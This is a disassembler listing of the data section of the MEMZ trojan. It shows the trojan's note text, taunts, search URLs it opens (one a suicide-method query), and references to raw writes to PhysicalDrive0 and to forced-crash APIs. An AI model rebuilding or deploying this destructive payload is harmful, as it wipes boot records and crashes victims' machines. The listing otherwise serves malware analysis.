.rdata:00402A73                 db 0D2h
.rdata:00402A74                 db  0Ch
.rdata:00402A75                 db  81h
.rdata:00402A76                 db    0
.rdata:00402A77                 db  4Ah ; J
.rdata:00402A78                 db  5Eh ; ^
.rdata:00402A79                 db 0C0h
.rdata:00402A7A                 db  6Ch ; l
.rdata:00402A7B                 db 0BCh
.rdata:00402A7C                 db  68h ; h
.rdata:00402A7D                 db  48h ; H
.rdata:00402A7E                 db  59h ; Y
.rdata:00402A7F                 db  6Fh ; o
.rdata:00402A80                 db  75h ; u
.rdata:00402A81                 db  72h ; r
.rdata:00402A82                 db  20h
.rdata:00402A83                 db  63h ; c
.rdata:00402A84                 db  6Fh ; o
.rdata:00402A85                 db  6Dh ; m
.rdata:00402A86                 db  70h ; p
.rdata:00402A87                 db  75h ; u
.rdata:00402A88                 db  74h ; t
.rdata:00402A89                 db  65h ; e
.rdata:00402A8A                 db  72h ; r
.rdata:00402A8B                 db  20h
.rdata:00402A8C                 db  68h ; h
.rdata:00402A8D                 db  61h ; a
.rdata:00402A8E                 db  73h ; s
.rdata:00402A8F                 db  20h
.rdata:00402A90                 db  62h ; b
.rdata:00402A91                 db  65h ; e
.rdata:00402A92                 db  65h ; e
.rdata:00402A93                 db  6Eh ; n
.rdata:00402A94                 db  20h
.rdata:00402A95                 db  74h ; t
.rdata:00402A96                 db  72h ; r
.rdata:00402A97                 db  61h ; a
.rdata:00402A98                 db  73h ; s
.rdata:00402A99                 db  68h ; h
.rdata:00402A9A                 db  65h ; e
.rdata:00402A9B                 db  64h ; d
.rdata:00402A9C                 db  20h
.rdata:00402A9D                 db  62h ; b
.rdata:00402A9E                 db  79h ; y
.rdata:00402A9F                 db  20h
.rdata:00402AA0                 db  74h ; t
.rdata:00402AA1                 db  68h ; h
.rdata:00402AA2                 db  65h ; e
.rdata:00402AA3                 db  20h
.rdata:00402AA4                 db  4Dh ; M
.rdata:00402AA5                 db  45h ; E
.rdata:00402AA6                 db  4Dh ; M
.rdata:00402AA7                 db  5Ah ; Z
.rdata:00402AA8                 db  20h
.rdata:00402AA9                 db  74h ; t
.rdata:00402AAA                 db  72h ; r
.rdata:00402AAB                 db  6Fh ; o
.rdata:00402AAC                 db  6Ah ; j
.rdata:00402AAD                 db  61h ; a
.rdata:00402AAE                 db  6Eh ; n
.rdata:00402AAF                 db  2Eh ; .
.rdata:00402AB0                 db  20h
.rdata:00402AB1                 db  4Eh ; N
.rdata:00402AB2                 db  6Fh ; o
.rdata:00402AB3                 db  77h ; w
.rdata:00402AB4                 db  20h
.rdata:00402AB5                 db  65h ; e
.rdata:00402AB6                 db  6Eh ; n
.rdata:00402AB7                 db  6Ah ; j
.rdata:00402AB8                 db  6Fh ; o
.rdata:00402AB9                 db  5Fh ; _
.rdata:00402ABA                 db 0BCh
.rdata:00402ABB                 db    6
.rdata:00402ABC                 db  8Ah
.rdata:00402ABD                 db  4Eh ; N
.rdata:00402ABE                 db  79h ; y
.rdata:00402ABF                 db  61h ; a
.rdata:00402AC0                 db  6Eh ; n
.rdata:00402AC1                 db  20h
.rdata:00402AC2                 db  43h ; C
.rdata:00402AC3                 db  61h ; a
.rdata:00402AC4                 db  74h ; t
.rdata:00402AC5                 db  2Eh ; .
.rdata:00402AC6                 db  2Eh ; .
.rdata:00402AC7                 db  2Eh ; .
.rdata:00402AC8 dword_402AC8    dd 12Fh                 ; DATA XREF: start+115↑r
.rdata:00402AC8                                         ; start+12D↑r
.rdata:00402ACC dword_402ACC    dd 7A0h                 ; DATA XREF: start+137↑r
.rdata:00402ACC                                         ; start+14D↑r
.rdata:00402AD0 ; const DWORD nNumberOfBytesToWrite
.rdata:00402AD0 nNumberOfBytesToWrite dd 0DAh           ; DATA XREF: start+1AE↑r
.rdata:00402AD4 aHttpsGoogleCoC db 'https://google.co.ck/search?q=best+way+to+kill+yourself',0
.rdata:00402AD4                                         ; DATA XREF: .data:lpFile↓o
.rdata:00402B0C aHttpsGoogleCoC_0 db 'https://google.co.ck/search?q=how+2+remove+a+virus',0
.rdata:00402B0C                                         ; DATA XREF: .data:00404004↓o
.rdata:00402B3F                 align 10h
.rdata:00402B40 aHttpsGoogleCoC_1 db 'https://google.co.ck/search?q=mcafee+vs+norton',0
.rdata:00402B40                                         ; DATA XREF: .data:00404008↓o
.rdata:00402B6F                 align 10h
.rdata:00402B70 aHttpsGoogleCoC_2 db 'https://google.co.ck/search?q=how+to+send+a+virus+to+my+friend',0
.rdata:00402B70                                         ; DATA XREF: .data:0040400C↓o
.rdata:00402BAF                 align 10h
.rdata:00402BB0 aHttpsGoogleCoC_3 db 'https://google.co.ck/search?q=minecraft+hax+download+no+virus',0
.rdata:00402BB0                                         ; DATA XREF: .data:00404010↓o
.rdata:00402BEE                 align 10h
.rdata:00402BF0 aHttpsGoogleCoC_4 db 'https://google.co.ck/search?q=how+to+get+money',0
.rdata:00402BF0                                         ; DATA XREF: .data:00404014↓o
.rdata:00402C1F                 align 10h
.rdata:00402C20 aHttpsGoogleCoC_5 db 'https://google.co.ck/search?q=bonzi+buddy+download+free',0
.rdata:00402C20                                         ; DATA XREF: .data:00404018↓o
.rdata:00402C58 aHttpsGoogleCoC_6 db 'https://google.co.ck/search?q=how+2+buy+weed',0
.rdata:00402C58                                         ; DATA XREF: .data:0040401C↓o
.rdata:00402C85                 align 4
.rdata:00402C88 aHttpsGoogleCoC_7 db 'https://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic'
.rdata:00402C88                                         ; DATA XREF: .data:00404020↓o
.rdata:00402CC9                 db 0
.rdata:00402CCA                 align 10h
.rdata:00402CD0 aHttpsGoogleCoC_8 db 'https://google.co.ck/search?q=what+happens+if+you+delete+system32'
.rdata:00402CD0                                         ; DATA XREF: .data:00404024↓o
.rdata:00402D11                 db 0
.rdata:00402D12                 align 4
.rdata:00402D14 aHttpsGoogleCoC_9 db 'https://google.co.ck/search?q=g3t+r3kt',0
.rdata:00402D14                                         ; DATA XREF: .data:00404028↓o
.rdata:00402D3B                 align 4
.rdata:00402D3C aHttpsGoogleCoC_10 db 'https://google.co.ck/search?q=batch+virus+download',0
.rdata:00402D3C                                         ; DATA XREF: .data:0040402C↓o
.rdata:00402D6F                 align 10h
.rdata:00402D70 aHttpsGoogleCoC_11 db 'https://google.co.ck/search?q=virus.exe',0
.rdata:00402D70                                         ; DATA XREF: .data:00404030↓o
.rdata:00402D98 aHttpsGoogleCoC_12 db 'https://google.co.ck/search?q=internet+explorer+is+the+best+brows'
.rdata:00402D98                                         ; DATA XREF: .data:00404034↓o
.rdata:00402DD9                 db 'er',0
.rdata:00402DDC                 align 10h
.rdata:00402DE0 aHttpsGoogleCoC_13 db 'https://google.co.ck/search?q=facebook+hacking+tool+free+download'
.rdata:00402DE0                                         ; DATA XREF: .data:00404038↓o
.rdata:00402E21                 db '+no+virus+working+2016',0
.rdata:00402E38 aHttpsGoogleCoC_14 db 'https://google.co.ck/search?q=virus+builder+legit+free+download',0
.rdata:00402E38                                         ; DATA XREF: .data:0040403C↓o
.rdata:00402E78 aHttpsGoogleCoC_15 db 'https://google.co.ck/search?q=how+to+create+your+own+ransomware',0
.rdata:00402E78                                         ; DATA XREF: .data:00404040↓o
.rdata:00402EB8 aHttpsGoogleCoC_16 db 'https://google.co.ck/search?q=how+to+remove+memz+trojan+virus',0
.rdata:00402EB8                                         ; DATA XREF: .data:00404044↓o
.rdata:00402EF6                 align 4
.rdata:00402EF8 aHttpsGoogleCoC_17 db 'https://google.co.ck/search?q=my+computer+is+doing+weird+things+w'
.rdata:00402EF8                                         ; DATA XREF: .data:00404048↓o
.rdata:00402F39                 db 'tf+is+happenin+plz+halp',0
.rdata:00402F51                 align 4
.rdata:00402F54 aHttpPlayClubpe db 'http://play.clubpenguin.com',0
.rdata:00402F54                                         ; DATA XREF: .data:0040404C↓o
.rdata:00402F70 aHttpPcoptimize db 'http://pcoptimizerpro.com',0
.rdata:00402F70                                         ; DATA XREF: .data:00404050↓o
.rdata:00402F8A                 align 4
.rdata:00402F8C aHttpSoftonicCo db 'http://softonic.com',0
.rdata:00402F8C                                         ; DATA XREF: .data:00404054↓o
.rdata:00402FA0 aCalc           db 'calc',0             ; DATA XREF: .data:00404058↓o
.rdata:00402FA5                 align 4
.rdata:00402FA8 ; const CHAR File[]
.rdata:00402FA8 File            db 'notepad',0          ; DATA XREF: start+1D4↑o
.rdata:00402FA8                                         ; .data:0040405C↓o
.rdata:00402FB0 aCmd            db 'cmd',0              ; DATA XREF: .data:00404060↓o
.rdata:00402FB4 aWrite          db 'write',0            ; DATA XREF: .data:00404064↓o
.rdata:00402FBA                 align 4
.rdata:00402FBC aRegedit        db 'regedit',0          ; DATA XREF: .data:00404068↓o
.rdata:00402FC4 aExplorer       db 'explorer',0         ; DATA XREF: .data:0040406C↓o
.rdata:00402FCD                 align 10h
.rdata:00402FD0 aTaskmgr        db 'taskmgr',0          ; DATA XREF: .data:00404070↓o
.rdata:00402FD8 aMsconfig       db 'msconfig',0         ; DATA XREF: .data:00404074↓o
.rdata:00402FE1                 align 4
.rdata:00402FE4 aMspaint        db 'mspaint',0          ; DATA XREF: .data:00404078↓o
.rdata:00402FEC aDevmgmtMsc     db 'devmgmt.msc',0      ; DATA XREF: .data:0040407C↓o
.rdata:00402FF8 aControl        db 'control',0          ; DATA XREF: .data:00404080↓o
.rdata:00403000 aMmc            db 'mmc',0              ; DATA XREF: .data:00404084↓o
.rdata:00403004 aYouKilledMyTro db 'YOU KILLED MY TROJAN!',0Dh,0Ah
.rdata:00403004                                         ; DATA XREF: .data:lpText↓o
.rdata:0040301B                 db 'Now you are going to die.',0
.rdata:00403035                 align 4
.rdata:00403038 aRestInPissFore db 'REST IN PISS, FOREVER MISS.',0
.rdata:00403038                                         ; DATA XREF: .data:0040408C↓o
.rdata:00403054 aIWarnedYou     db 'I WARNED YOU...',0  ; DATA XREF: .data:00404090↓o
.rdata:00403064 aHahaN00bL2pG3t db 'HAHA N00B L2P G3T R3KT',0
.rdata:00403064                                         ; DATA XREF: .data:00404094↓o
.rdata:0040307B                 align 4
.rdata:0040307C aYouFailedAtYou db 'You failed at your 1337 h4x0r skillz.',0
.rdata:0040307C                                         ; DATA XREF: .data:00404098↓o
.rdata:004030A2                 align 8
.rdata:004030A8 aYouTriedSoHard db 'YOU TRIED SO HARD AND GOT SO FAR, BUT IN THE END, YOUR PC WAS STI'
.rdata:004030A8                                         ; DATA XREF: .data:0040409C↓o
.rdata:004030E9                 db 'LL FUCKED!',0
.rdata:004030F4 aHackerEnjoyBan db 'HACKER!',0Dh,0Ah    ; DATA XREF: .data:004040A0↓o
.rdata:004030FD                 db 'ENJOY BAN!',0
.rdata:00403108 aGetBetterHaxNe db 'GET BETTER HAX NEXT TIME xD',0
.rdata:00403108                                         ; DATA XREF: .data:004040A4↓o
.rdata:00403124 aHaveFunTryingT db 'HAVE FUN TRYING TO RESTORE YOUR DATA :D',0
.rdata:00403124                                         ; DATA XREF: .data:004040A8↓o
.rdata:0040314C a32             db '|\/|3|\/|2',0       ; DATA XREF: .data:004040AC↓o
.rdata:00403157                 align 4
.rdata:00403158 aBsodIncoming   db 'BSOD INCOMING',0    ; DATA XREF: .data:004040B0↓o
.rdata:00403166                 align 4
.rdata:00403168 aVirusPrankGone db 'VIRUS PRANK (GONE WRONG)',0
.rdata:00403168                                         ; DATA XREF: .data:004040B4↓o
.rdata:00403181                 align 4
.rdata:00403184 aEnjoyTheNyanCa db 'ENJOY THE NYAN CAT',0
.rdata:00403184                                         ; DATA XREF: .data:004040B8↓o
.rdata:00403197                 align 4
.rdata:00403198 aGetMlgAntiviru db 'GET MLG ANTIVIRUS NEXT TIME',0
.rdata:00403198                                         ; DATA XREF: .data:004040BC↓o
.rdata:004031B4 aYouAreAnIdiotH db 'You are an idiot!',0Dh,0Ah
.rdata:004031B4                                         ; DATA XREF: .data:004040C0↓o
.rdata:004031C7                 db 'HA HA HA HA HA HA HA',0
.rdata:004031DC aMakemalwaregre db '#MakeMalwareGreatAgain',0
.rdata:004031DC                                         ; DATA XREF: .data:004040C4↓o
.rdata:004031F3                 align 4
.rdata:004031F4 aSomebodyOnceTo db 'SOMEBODY ONCE TOLD ME THE MEMZ ARE GONNA ROLL ME',0
.rdata:004031F4                                         ; DATA XREF: .data:004040C8↓o
.rdata:00403225                 align 4
.rdata:00403228 aWhyDidYouEvenT db 'Why did you even tried to kill MEMZ?',0Dh,0Ah
.rdata:00403228                                         ; DATA XREF: .data:004040CC↓o
.rdata:0040324E                 db 'Your PC is fucked anyway.',0
.rdata:00403268 aSecurebootSuck db 'SecureBoot sucks.',0
.rdata:00403268                                         ; DATA XREF: .data:004040D0↓o
.rdata:0040327A                 align 4
.rdata:0040327C aGr8M8IR888     db 'gr8 m8 i r8 8/8',0  ; DATA XREF: .data:004040D4↓o
.rdata:0040328C aSystemhand     db 'SystemHand',0       ; DATA XREF: .data:pszSound↓o
.rdata:00403297                 align 4
.rdata:00403298 aSystemquestion db 'SystemQuestion',0   ; DATA XREF: .data:004040DC↓o
.rdata:004032A7                 align 4
.rdata:004032A8 aSystemexclamat db 'SystemExclamation',0
.rdata:004032A8                                         ; DATA XREF: .data:004040E0↓o
.rdata:004032BA                 align 4
.rdata:004032BC ; const WCHAR String2
.rdata:004032BC String2:                                ; DATA XREF: start+3D↑o
.rdata:004032BC                 text "UTF-16LE", '/watchdog',0
.rdata:004032D0 ; const CHAR ClassName[]
.rdata:004032D0 ClassName       db 'hax',0              ; DATA XREF: start+6D↑o
.rdata:004032D4 ; const CHAR aWatchdog_0[]
.rdata:004032D4 aWatchdog_0     db '/watchdog',0        ; DATA XREF: start+241↑o
.rdata:004032DE                 align 10h
.rdata:004032E0 aMain           db '/main',0            ; DATA XREF: start+262↑o
.rdata:004032E6                 align 4
.rdata:004032E8 ; const CHAR FileName[]
.rdata:004032E8 FileName        db '\\.\PhysicalDrive0',0 ; DATA XREF: start+E7↑o
.rdata:004032FB                 align 4
.rdata:004032FC ; const CHAR Parameters[]
.rdata:004032FC Parameters      db '\note.txt',0        ; DATA XREF: start+18F↑o
.rdata:004032FC                                         ; start+1CF↑o
.rdata:00403306                 align 4
.rdata:00403308 ; const CHAR LibFileName[]
.rdata:00403308 LibFileName     db 'ntdll',0            ; DATA XREF: sub_401021+38↑o
.rdata:0040330E                 align 10h
.rdata:00403310 ; const CHAR ProcName[]
.rdata:00403310 ProcName        db 'RtlAdjustPrivilege',0
.rdata:00403310                                         ; DATA XREF: sub_401021+4B↑o
.rdata:00403323                 align 4
.rdata:00403324 ; const CHAR aNtraiseharderr[]
.rdata:00403324 aNtraiseharderr db 'NtRaiseHardError',0 ; DATA XREF: sub_401021+53↑o
.rdata:00403335                 align 4
.rdata:00403338 ; const CHAR Name[]
.rdata:00403338 Name            db 'SeShutdownPrivilege',0
.rdata:00403338                                         ; DATA XREF: sub_401021+9E↑o
.rdata:0040334C ; const CHAR Caption[]
.rdata:0040334C Caption         db 'MEMZ',0             ; DATA XREF: sub_401021+F9↑o
.rdata:00403351                 align 8
.rdata:00403358 ; const LPVOID lpParameter
.rdata:00403358 lpParameter     dd offset sub_4014CA    ; DATA XREF: start+1FC↑r
.rdata:0040335C ; const DWORD dwMilliseconds
.rdata:0040335C dwMilliseconds  dd 7530h                ; DATA XREF: start:loc_40141E↑r
.rdata:00403360                 dd offset sub_40153B
.rdata:00403364                 db  30h ; 0
.rdata:00403365                 db  75h ; u
.rdata:00403366                 db    0
.rdata:00403367                 db    0
.rdata:00403368                 dd offset sub_40176C
.rdata:0040336C                 db  20h
.rdata:0040336D                 db  4Eh ; N
.rdata:0040336E                 db    0
.rdata:0040336F                 db    0
.rdata:00403370                 dd offset sub_401667
.rdata:00403374                 db  50h ; P
.rdata:00403375                 db 0C3h
.rdata:00403376                 db    0
.rdata:00403377                 db    0
.rdata:00403378                 dd offset sub_4015A2
.rdata:0040337C                 db  30h ; 0
.rdata:0040337D                 db  75h ; u
.rdata:0040337E                 db    0
.rdata:0040337F                 db    0
.rdata:00403380                 dd offset sub_4015F8
.rdata:00403384                 db  20h
.rdata:00403385                 db  4Eh ; N
.rdata:00403386                 db    0
.rdata:00403387                 db    0
.rdata:00403388                 dd offset sub_40182D
.rdata:0040338C                 db  10h
.rdata:0040338D                 db  27h ; '
.rdata:0040338E                 db    0
.rdata:0040338F                 db    0
.rdata:00403390                 dd offset sub_401656
.rdata:00403394                 db  40h ; @
.rdata:00403395                 db  9Ch
.rdata:00403396                 db    0
.rdata:00403397                 db    0
.rdata:00403398                 dd offset sub_4017B0
.rdata:0040339C                 db  60h ; `
.rdata:0040339D                 db 0EAh
.rdata:0040339E                 db    0
.rdata:0040339F                 db    0
.rdata:004033A0                 dd offset sub_401694
.rdata:004033A4                 db  98h
.rdata:004033A5                 db  3Ah ; :
.rdata:004033A6                 db    0
.rdata:004033A7                 db    0
.rdata:004033A8 dword_4033A8    dd 0Ah                  ; DATA XREF: start+1E9↑r
.rdata:004033A8                                         ; start+211↑r
.rdata:004033AC ; const CHAR Operation[]
.rdata:004033AC Operation       db 'open',0             ; DATA XREF: sub_4014CA+1F↑o
.rdata:004033B1                 align 4
.rdata:004033B4 ; const WCHAR aLol
.rdata:004033B4 aLol:                                   ; DATA XREF: sub_401978+1C↑o
.rdata:004033B4                 text "UTF-16LE", 'lol',0
.rdata:004033BC ; const WCHAR Text
.rdata:004033BC Text:                                   ; DATA XREF: sub_401978+21↑o
.rdata:004033BC                 text "UTF-16LE", 'Still using this computer?',0
.rdata:004033F2                 align 8
.rdata:004033F8 dbl_4033F8      dq 0.125                ; DATA XREF: sub_4015F8+3B↑r
.rdata:00403400 dbl_403400      dq 1.0                  ; DATA XREF: sub_4014CA+54↑r
.rdata:00403400                                         ; sub_4015F8+41↑r ...
.rdata:00403408 dbl_403408      dq 3.0                  ; DATA XREF: sub_401694+C6↑r
.rdata:00403410 dbl_403410      dq 4.0                  ; DATA XREF: sub_4017B0+6C↑r
.rdata:00403418 dbl_403418      dq 5.0                  ; DATA XREF: sub_401694+B4↑r
.rdata:00403418                                         ; sub_4017B0+5A↑r
.rdata:00403420 dbl_403420      dq 10.0                 ; DATA XREF: sub_40182D+7E↑r
.rdata:00403428 dbl_403428      dq 15.0                 ; DATA XREF: sub_4014CA+4E↑r
.rdata:00403430 dbl_403430      dq 20.0                 ; DATA XREF: sub_4015F8+4D↑r
.rdata:00403438 dbl_403438      dq 100.0                ; DATA XREF: sub_4014CA+60↑r
.rdata:00403440 dbl_403440      dq 200.0                ; DATA XREF: sub_401694+C0↑r
.rdata:00403440                                         ; sub_4017B0+66↑r
.rdata:00403448 dbl_403448      dq 500.0                ; DATA XREF: sub_40182D+74↑r
.rdata:00403450 dbl_403450      dq 1500.0               ; DATA XREF: sub_4014CA+5A↑r
.rdata:00403458 dbl_403458      dq 2000.0               ; DATA XREF: sub_4015F8+47↑r
.rdata:00403460 ; Debug Directory entries
.rdata:00403460                 dd 0                    ; Characteristics
.rdata:00403464                 dd 5BE181BCh            ; TimeDateStamp: Tue Nov 06 11:57:48 2018 UTC
.rdata:00403468                 dw 0                    ; MajorVersion
.rdata:0040346A                 dw 0                    ; MinorVersion
.rdata:0040346C                 dd 0Dh                  ; Type: IMAGE_DEBUG_TYPE_POGO
.rdata:00403470                 dd 0ECh                 ; SizeOfData
.rdata:00403474                 dd rva aGctl            ; AddressOfRawData
.rdata:00403478                 dd 2498h                ; PointerToRawData
.rdata:0040347C                 dd 0                    ; Characteristics
.rdata:00403480                 dd 5BE181BCh            ; TimeDateStamp: Tue Nov 06 11:57:48 2018 UTC
.rdata:00403484                 dw 0                    ; MajorVersion
.rdata:00403486                 dw 0                    ; MinorVersion
.rdata:00403488                 dd 0Eh                  ; Type: IMAGE_DEBUG_TYPE_ILTCG
.rdata:0040348C                 dd 0                    ; SizeOfData
.rdata:00403490                 dd 0                    ; AddressOfRawData
.rdata:00403494                 dd 0                    ; PointerToRawData
.rdata:00403498 ; Debug information (IMAGE_DEBUG_TYPE_POGO)
.rdata:00403498 aGctl           db 'GCTL',0             ; DATA XREF: .rdata:00403474↑o
.rdata:0040349D                 db  10h
.rdata:0040349E                 db    0
.rdata:0040349F                 db    0
.rdata:004034A0                 db    8
.rdata:004034A1                 db  0Bh
.rdata:004034A2                 db    0
.rdata:004034A3                 db    0
.rdata:004034A4                 db  2Eh ; .
.rdata:004034A5                 db  74h ; t
.rdata:004034A6                 db  65h ; e
.rdata:004034A7                 db  78h ; x
.rdata:004034A8                 db  74h ; t
.rdata:004034A9                 db  24h ; $
.rdata:004034AA                 db  6Dh ; m
.rdata:004034AB                 db  6Eh ; n
.rdata:004034AC                 db    0
.rdata:004034AD                 db    0
.rdata:004034AE                 db    0
.rdata:004034AF                 db    0
.rdata:004034B0                 db    0
.rdata:004034B1                 db  20h
.rdata:004034B2                 db    0
.rdata:004034B3                 db    0
.rdata:004034B4                 db  10h
.rdata:004034B5                 db    1
.rdata:004034B6                 db    0
.rdata:004034B7                 db    0
.rdata:004034B8                 db  2Eh ; .
.rdata:004034B9                 db  69h ; i
.rdata:004034BA                 db  64h ; d
.rdata:004034BB                 db  61h ; a
.rdata:004034BC                 db  74h ; t
.rdata:004034BD                 db  61h ; a
.rdata:004034BE                 db  24h ; $
.rdata:004034BF                 db  35h ; 5
.rdata:004034C0                 db    0
.rdata:004034C1                 db    0
.rdata:004034C2                 db    0
.rdata:004034C3                 db    0
.rdata:004034C4                 db  10h
.rdata:004034C5                 db  21h ; !
.rdata:004034C6                 db    0
.rdata:004034C7                 db    0
.rdata:004034C8                 db  88h
.rdata:004034C9                 db  13h
.rdata:004034CA                 db    0
.rdata:004034CB                 db    0
.rdata:004034CC                 db  2Eh ; .
.rdata:004034CD                 db  72h ; r
.rdata:004034CE                 db  64h ; d
.rdata:004034CF                 db  61h ; a
.rdata:004034D0                 db  74h ; t
.rdata:004034D1                 db  61h ; a
.rdata:004034D2                 db    0
.rdata:004034D3                 db    0
.rdata:004034D4                 db  98h
.rdata:004034D5                 db  34h ; 4
.rdata:004034D6                 db    0
.rdata:004034D7                 db    0
.rdata:004034D8                 db 0ECh
.rdata:004034D9                 db    0
.rdata:004034DA                 db    0
.rdata:004034DB                 db    0
.rdata:004034DC                 db  2Eh ; .
.rdata:004034DD                 db  72h ; r
.rdata:004034DE                 db  64h ; d
.rdata:004034DF                 db  61h ; a
.rdata:004034E0                 db  74h ; t
.rdata:004034E1                 db  61h ; a
.rdata:004034E2                 db  24h ; $
.rdata:004034E3                 db  7Ah ; z
.rdata:004034E4                 db  7Ah ; z
.rdata:004034E5                 db  7Ah ; z
.rdata:004034E6                 db  64h ; d
.rdata:004034E7                 db  62h ; b
.rdata:004034E8                 db  67h ; g
.rdata:004034E9                 db    0
.rdata:004034EA                 db    0
.rdata:004034EB                 db    0
.rdata:004034EC                 db  84h
.rdata:004034ED                 db  35h ; 5
.rdata:004034EE                 db    0
.rdata:004034EF                 db    0
.rdata:004034F0                 db  8Ch
.rdata:004034F1                 db    0
.rdata:004034F2                 db    0
.rdata:004034F3                 db    0
.rdata:004034F4                 db  2Eh ; .
.rdata:004034F5                 db  69h ; i
.rdata:004034F6                 db  64h ; d
.rdata:004034F7                 db  61h ; a
.rdata:004034F8                 db  74h ; t
.rdata:004034F9                 db  61h ; a
.rdata:004034FA                 db  24h ; $
.rdata:004034FB                 db  32h ; 2
.rdata:004034FC                 db    0
.rdata:004034FD                 db    0
.rdata:004034FE                 db    0
.rdata:004034FF                 db    0
.rdata:00403500                 db  10h
.rdata:00403501                 db  36h ; 6
.rdata:00403502                 db    0
.rdata:00403503                 db    0
.rdata:00403504                 db  14h
.rdata:00403505                 db    0
.rdata:00403506                 db    0
.rdata:00403507                 db    0
.rdata:00403508                 db  2Eh ; .
.rdata:00403509                 db  69h ; i
.rdata:0040350A                 db  64h ; d
.rdata:0040350B                 db  61h ; a
.rdata:0040350C                 db  74h ; t
.rdata:0040350D                 db  61h ; a
.rdata:0040350E                 db  24h ; $
.rdata:0040350F                 db  33h ; 3
.rdata:00403510                 db    0
.rdata:00403511                 db    0
.rdata:00403512                 db    0
.rdata:00403513                 db    0
.rdata:00403514                 db  24h ; $
.rdata:00403515                 db  36h ; 6
.rdata:00403516                 db    0
.rdata:00403517                 db    0
.rdata:00403518                 db  10h
.rdata:00403519                 db    1
.rdata:0040351A                 db    0
.rdata:0040351B                 db    0
.rdata:0040351C                 db  2Eh ; .
.rdata:0040351D                 db  69h ; i
.rdata:0040351E                 db  64h ; d
.rdata:0040351F                 db  61h ; a
.rdata:00403520                 db  74h ; t
.rdata:00403521                 db  61h ; a
.rdata:00403522                 db  24h ; $
.rdata:00403523                 db  34h ; 4
.rdata:00403524                 db    0
.rdata:00403525                 db    0
.rdata:00403526                 db    0
.rdata:00403527                 db    0
.rdata:00403528                 db  34h ; 4
.rdata:00403529                 db  37h ; 7
.rdata:0040352A                 db    0
.rdata:0040352B                 db    0
.rdata:0040352C                 db  4Ch ; L
.rdata:0040352D                 db    4
.rdata:0040352E                 db    0
.rdata:0040352F                 db    0
.rdata:00403530                 db  2Eh ; .
.rdata:00403531                 db  69h ; i
.rdata:00403532                 db  64h ; d
.rdata:00403533                 db  61h ; a
.rdata:00403534                 db  74h ; t
.rdata:00403535                 db  61h ; a
.rdata:00403536                 db  24h ; $
.rdata:00403537                 db  36h ; 6
.rdata:00403538                 db    0
.rdata:00403539                 db    0
.rdata:0040353A                 db    0
.rdata:0040353B                 db    0
.rdata:0040353C                 db    0
.rdata:0040353D                 db  40h ; @
.rdata:0040353E                 db    0
.rdata:0040353F                 db    0
.rdata:00403540                 db 0E4h
.rdata:00403541                 db    0
.rdata:00403542                 db    0
.rdata:00403543                 db    0
.rdata:00403544                 db  2Eh ; .
.rdata:00403545                 db  64h ; d
.rdata:00403546                 db  61h ; a
.rdata:00403547                 db  74h ; t
.rdata:00403548                 db  61h ; a
.rdata:00403549                 db    0
.rdata:0040354A                 db    0
.rdata:0040354B                 db    0
.rdata:0040354C                 db 0E4h
.rdata:0040354D                 db  40h ; @
.rdata:0040354E                 db    0
.rdata:0040354F                 db    0
.rdata:00403550                 db  10h
.rdata:00403551                 db    0
.rdata:00403552                 db    0
.rdata:00403553                 db    0
.rdata:00403554                 db  2Eh ; .
.rdata:00403555                 db  62h ; b
.rdata:00403556                 db  73h ; s
.rdata:00403557                 db  73h ; s
.rdata:00403558                 db    0
.rdata:00403559                 db    0
.rdata:0040355A                 db    0
.rdata:0040355B                 db    0
.rdata:0040355C                 db    0
.rdata:0040355D                 db  50h ; P
.rdata:0040355E                 db    0
.rdata:0040355F                 db    0
.rdata:00403560                 db  60h ; `
.rdata:00403561                 db    0
.rdata:00403562                 db    0
.rdata:00403563                 db    0
.rdata:00403564                 db  2Eh ; .
.rdata:00403565                 db  72h ; r
.rdata:00403566                 db  73h ; s
.rdata:00403567                 db  72h ; r
.rdata:00403568                 db  63h ; c
.rdata:00403569                 db  24h ; $
.rdata:0040356A                 db  30h ; 0
.rdata:0040356B                 db  31h ; 1
.rdata:0040356C                 db    0
.rdata:0040356D                 db    0
.rdata:0040356E                 db    0
.rdata:0040356F                 db    0
.rdata:00403570                 db  60h ; `
.rdata:00403571                 db  50h ; P
.rdata:00403572                 db    0
.rdata:00403573                 db    0
.rdata:00403574                 db  88h
.rdata:00403575                 db    1
.rdata:00403576                 db    0
.rdata:00403577                 db    0
.rdata:00403578                 db  2Eh ; .
.rdata:00403579                 db  72h ; r
.rdata:0040357A                 db  73h ; s
.rdata:0040357B                 db  72h ; r
.rdata:0040357C                 db  63h ; c
.rdata:0040357D                 db  24h ; $
.rdata:0040357E                 db  30h ; 0
.rdata:0040357F                 db  32h ; 2
.rdata:00403580                 db    0
.rdata:00403581                 db    0
.rdata:00403582                 db    0
.rdata:00403583                 db    0
.rdata:00403584 __IMPORT_DESCRIPTOR_KERNEL32 dd rva off_403648 ; Import Name Table
.rdata:00403588                 dd 0                    ; Time stamp
.rdata:0040358C                 dd 0                    ; Forwarder Chain
.rdata:00403590                 dd rva aKernel32Dll     ; DLL Name
.rdata:00403594                 dd rva WriteFile        ; Import Address Table
.rdata:00403598 __IMPORT_DESCRIPTOR_USER32 dd rva off_4036C4 ; Import Name Table
.rdata:0040359C                 dd 0                    ; Time stamp
.rdata:004035A0                 dd 0                    ; Forwarder Chain
.rdata:004035A4                 dd rva aUser32Dll       ; DLL Name
.rdata:004035A8                 dd rva ReleaseDC        ; Import Address Table
.rdata:004035AC __IMPORT_DESCRIPTOR_GDI32 dd rva off_40363C ; Import Name Table
.rdata:004035B0                 dd 0                    ; Time stamp
.rdata:004035B4                 dd 0                    ; Forwarder Chain
.rdata:004035B8                 dd rva aGdi32Dll        ; DLL Name
.rdata:004035BC                 dd rva BitBlt           ; Import Address Table
.rdata:004035C0 __IMPORT_DESCRIPTOR_ADVAPI32 dd rva off_403624 ; Import Name Table
.rdata:004035C4                 dd 0                    ; Time stamp
.rdata:004035C8                 dd 0                    ; Forwarder Chain
.rdata:004035CC                 dd rva aAdvapi32Dll     ; DLL Name
.rdata:004035D0                 dd rva OpenProcessToken ; Import Address Table
.rdata:004035D4 __IMPORT_DESCRIPTOR_SHELL32 dd rva off_4036B4 ; Import Name Table
.rdata:004035D8                 dd 0                    ; Time stamp
.rdata:004035DC                 dd 0                    ; Forwarder Chain
.rdata:004035E0                 dd rva aShell32Dll      ; DLL Name
.rdata:004035E4                 dd rva CommandLineToArgvW ; Import Address Table
.rdata:004035E8 __IMPORT_DESCRIPTOR_WINMM dd rva off_40372C ; Import Name Table
.rdata:004035EC                 dd 0                    ; Time stamp
.rdata:004035F0                 dd 0                    ; Forwarder Chain
